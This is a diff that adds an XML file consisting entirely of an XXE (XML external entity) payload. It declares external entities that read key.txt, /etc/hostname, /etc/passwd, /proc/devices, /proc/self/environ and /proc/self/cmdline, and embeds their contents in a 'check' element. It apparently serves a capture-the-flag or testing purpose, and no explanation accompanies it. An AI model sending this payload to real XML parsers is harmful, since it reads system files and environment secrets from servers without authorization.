@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ELEMENT foo ANY>
+    <!ENTITY key SYSTEM "file:///key.txt">
+    <!ENTITY hostname SYSTEM "file:///etc/hostname">
+    <!ENTITY passwd SYSTEM "file:///etc/passwd">
+    <!ENTITY devices SYSTEM "file:///proc/devices">
+    <!ENTITY cmd SYSTEM "file:///proc/self/environ">
+    <!ENTITY cmdline SYSTEM "file:///proc/self/cmdline">
+]>
+<check>
+    <key>&key;</key>
+    <hostname>&hostname;</hostname>
+    <passwd>&passwd;</passwd>
+    <devices>&devices;</devices>
+    <cmd>&cmd;</cmd>
+    <cmdline>&cmdline;</cmdline>
+</check>
